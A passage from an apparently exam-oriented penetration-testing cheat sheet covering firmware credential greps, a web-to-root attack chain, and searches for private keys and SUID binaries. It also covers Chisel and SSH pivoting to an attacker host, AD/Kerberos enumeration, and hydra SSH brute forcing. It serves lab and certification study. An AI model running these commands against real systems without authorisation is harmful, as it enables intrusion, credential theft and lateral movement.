## 6.7 BusyBox / Compiler / Device Information

```bash
strings <FILE> | grep -i busybox
```
Finds the embedded BusyBox version.

```bash
strings <FILE> | grep -iE 'gcc|compiler|build'
```
Finds compiler/build information.

```bash
grep -Rni 'DeviceID' <EXTRACTED_DIR>
```
Searches firmware web/config files for device identifiers.

## 6.8 Architecture

```bash
file <EXTRACTED_BINARY>
```
Identifies the binary architecture.

```bash
readelf -h <EXTRACTED_BINARY>
```
Shows ELF architecture and header information.

## 6.9 AttifyOS / FAT

```bash
./fat.py /home/<USER>/<FIRMWARE>
```
Emulates a compatible firmware image using Firmware Analysis Toolkit.

## 6.10 Firmware Web Source

```bash
grep -RniE 'password|passwd|DeviceID|admin|web_passwd' <EXTRACTED_DIR>/www <EXTRACTED_DIR>/var 2>/dev/null
```
Searches web/config files for device and credential information.

---

# 7. WEB → LINUX → PRIVESC CHAIN

## 7.1 Typical Chain

```text
Web Enumeration
→ CMS/Plugin Detection
→ Vulnerability Research
→ LFI / SQLi / Upload / Logic Flaw
→ Command Execution
→ Shell
→ Linux Enumeration
→ SUID / Sudo / Keys / Kernel
→ Root
```
Use this chain when a web compromise leads to a Linux host.

## 7.2 Basic Post-Command-Execution Set

```bash
whoami
id
pwd
uname -a
ip addr
ip route
ss -lntup
```
Quickly identifies identity, OS, network and listening services.

```bash
find / -name '*flag*' -o -name '*secret*' 2>/dev/null
```
Searches the filesystem for likely challenge files.

---

# 8. PIVOTING QUICK FLOW

## 8.1 SSH Dynamic SOCKS

```bash
ssh -D 1080 <USER>@<PIVOT>
```
Creates a SOCKS pivot.

```bash
proxychains nmap -sT -Pn <INTERNAL_TARGET>
```
Scans an internal target through the SOCKS pivot.

## 8.2 SSHuttle

```bash
sshuttle -r <USER>@<PIVOT> <INTERNAL_SUBNET>
```
Creates transparent routing to an internal subnet.

```bash
nmap -sC -sV <INTERNAL_TARGET>
```
Scans the target after the route is established.

## 8.3 Chisel

```bash
./chisel server --reverse -p <PORT>
```
Starts the reverse-tunnel server.

```bash
./chisel client <ATTACKER>:<PORT> R:socks
```
Creates a reverse SOCKS tunnel.

```bash
proxychains nmap -sT -Pn <INTERNAL_TARGET>
```
Uses the Chisel SOCKS tunnel for internal TCP access.

## 8.4 Second Pivot

```bash
ssh -J <USER>@<PIVOT1> <USER>@<PIVOT2>
```
Reaches a second pivot through the first pivot.

```text
ATTACKER → PIVOT 1 → PIVOT 2 → TARGET
```
Use this mental model for double-pivot problems.

---

# 9. EXTRA PRACTICAL METHODS

> These are **additional practical methods** that may be useful depending on the target and exam scenario.

## 9.1 Ligolo-ng

```bash
ligolo-proxy -selfcert
```
Starts a Ligolo-ng proxy for lab tunneling.

```text
Ligolo agent → connect to proxy → create/select tunnel
```
Provides routed access to internal networks without relying on SOCKS for every tool.

## 9.2 LDAP Enumeration

```bash
ldapsearch -x -H ldap://<DC> -b 'DC=<DOMAIN>,DC=<TLD>'
```
Queries LDAP directory information when anonymous or authorized access is available.

## 9.3 Kerberos Enumeration

```bash
nmap -p88 -sV <DC>
```
Checks whether Kerberos is exposed.

```bash
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -no-pass
```
Checks for users configured without Kerberos pre-authentication when permitted.

## 9.4 BloodHound Data Collection

```bash
bloodhound-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All
```
Collects AD relationship data for graph analysis.

## 9.5 Web Technology Fingerprinting

```bash
whatweb http://<TARGET>/
```
Quickly identifies web technologies before deeper enumeration.

## 9.6 Alternative Directory Enumeration

```bash
feroxbuster -u http://<TARGET> -w <WORDLIST>
```
Alternative recursive web content discovery.

```bash
gobuster dir -u http://<TARGET> -w <WORDLIST>
```
Alternative directory/file enumeration.

---

# 10. EXAM FLOW

## 10.1 First Pass

```bash
nmap -sn <SUBNET>
```
Find live hosts.

```bash
nmap -p- <TARGET>
```
Find all TCP ports.

```bash
nmap -sC -sV -p <OPEN_PORTS> <TARGET>
```
Identify services and versions.

## 10.2 Branch by Service

```text
80/443      → WEB TESTING
22          → SSH / Linux
445         → SMB / Windows / AD
3389        → RDP
5985/5986   → WinRM
88/389      → AD / Kerberos / LDAP
Custom port → BINARY TESTING
Firmware    → IOT / FIRMWARE
502         → MODBUS / OT
```
Choose the matching section instead of randomly running tools.

## 10.3 After Initial Access

```bash
whoami
id
uname -a
ip addr
ip route
ss -lntup
```
Immediately establish identity, OS and network position.

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```
Check the fastest common Linux privilege-escalation paths.

```bash
find / -type f \( -name 'id_rsa' -o -name '*.key' \) 2>/dev/null
```
Search for reusable credentials/keys.

## 10.4 Pivot Decision

```text
Can attacker reach target directly?
        ↓ NO
Does compromised host have another interface/subnet?
        ↓ YES
Try SSH Dynamic / SSHuttle / Chisel
        ↓
Scan internal subnet
        ↓
Compromise next host
        ↓
Repeat if another subnet exists
```
Use the pivot whenever the compromised host provides access to a hidden network.

---

# 11. QUICK COMMAND TABLE

| Area | First commands |
|---|---|
| Host discovery | `nmap -sn <SUBNET>` |
| Full TCP | `nmap -p- <TARGET>` |
| Service enum | `nmap -sC -sV <TARGET>` |
| Web dirs | `ffuf -u http://<TARGET>/FUZZ -w <WORDLIST>` |
| WordPress | `wpscan --url http://<TARGET>` |
| Web vuln scan | `nikto -h http://<TARGET>` |
| SQLi | `sqlmap -u '<URL>' --batch` |
| SMB | `nxc smb <TARGET>` |
| RDP | `xfreerdp /v:<TARGET> /u:<USER> /p:'<PASSWORD>'` |
| SSH | `ssh <USER>@<TARGET>` |
| SSH credential test | `hydra -L users.txt -P passwords.txt ssh://<TARGET>` |
| WinRM | `evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>'` |
| SSH pivot | `ssh -D 1080 <USER>@<PIVOT>` |
| SSHuttle | `sshuttle -r <USER>@<PIVOT> <SUBNET>` |
| Chisel | `./chisel client <ATTACKER>:<PORT> R:socks` |
| Pivot scan | `proxychains nmap -sT -Pn <TARGET>` |
| Linux enum | `id; uname -a; ip addr; ip route` |
| SUID | `find / -perm -4000 -type f 2>/dev/null` |
| Sudo | `sudo -l` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Keys | `find / -name 'id_rsa' 2>/dev/null` |
| Binary | `file <BINARY>; checksec --file=<BINARY>` |
| Strings | `strings <BINARY>` |
| Symbols | `nm <BINARY>` |
| ELF | `readelf -h <BINARY>` |
| Disassembly | `objdump -d <BINARY>` |
| Debug | `gdb <BINARY>` |
| Offset | `cyclic_find(<VALUE>)` |
| Firmware | `binwalk -e <FIRMWARE>` |
| SQLite | `sqlite3 <DATABASE>` |
| Modbus | `tcpdump -i <IFACE> -nn -s0 port 502 -w modbus.pcap` |
| PCAP | `wireshark modbus.pcap` |

---

# 12. MOST IMPORTANT RULE

```text
DISCOVER
→ ENUMERATE
→ IDENTIFY
→ VALIDATE
→ EXPLOIT
→ SHELL
→ PRIVESC
→ PIVOT
→ ENUMERATE AGAIN
→ DOCUMENT
```

**Commands first. If you do not know a command, search/ask AI for that one command instead of memorizing theory.**
